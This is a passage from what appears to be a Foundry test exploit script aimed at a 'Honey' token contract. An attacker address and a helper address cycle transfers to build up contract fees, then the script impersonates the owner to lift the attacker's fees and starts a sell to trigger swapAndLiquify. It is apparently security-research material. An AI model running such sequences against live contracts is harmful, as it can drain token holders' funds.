        for (uint i = 0; i < 5; i++) {
            uint256 transferAmount = honeyBalance / 20; // Transfer 5% each time

            // Transfer from attacker to helper
            vm.startPrank(attacker);
            Honey(TARGET).transfer(helper, transferAmount);
            vm.stopPrank();

            // Transfer back from helper to attacker
            vm.startPrank(helper);
            Honey(TARGET).transfer(attacker, Honey(TARGET).balanceOf(helper));
            vm.stopPrank();
        }

        // Step 3: Check if contract has accumulated enough fees
        uint256 contractBalance = Honey(TARGET).balanceOf(TARGET);
        uint256 swapThreshold = Honey(TARGET).swapTokensAtAmount();
        console.log("Contract balance:", contractBalance);
        console.log("Swap threshold:", swapThreshold);

        // If contract doesn't have enough fees, we need to accumulate more
        if (contractBalance < swapThreshold) {
            // Make more transfers with attacker paying fees
            uint256 currentBalance = Honey(TARGET).balanceOf(attacker);
            uint256 amountToTransfer = currentBalance / 2;

            for (uint i = 0; i < 3; i++) {
                // Transfer from attacker to helper
                vm.startPrank(attacker);
                Honey(TARGET).transfer(helper, amountToTransfer);
                vm.stopPrank();

                // Transfer back from helper to attacker
                vm.startPrank(helper);
                Honey(TARGET).transfer(attacker, Honey(TARGET).balanceOf(helper));
                vm.stopPrank();
            }
        }

        // Step 4: Trigger swapAndLiquify by selling tokens
        // First, add fee exclusion back to avoid paying sell tax
        vm.startPrank(owner);
        address[] memory accounts = new address[](1);
        accounts[0] = attacker;
        Honey(TARGET).bulkExcludeFee(accounts, true);
        vm.stopPrank();

        // Get BNB balance before selling
        uint256 bnbBefore = address(attacker).balance;

        // Sell tokens to trigger swapAndLiquify
        vm.startPrank(attacker);

        // Approve router to spend Honey tokens
        uint256 sellAmount = Honey(TARGET).balanceOf(attacker) / 2;
        Honey(TARGET).approve(routerAddress, sellAmount);

        // Create sell path: Honey -> WETH
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
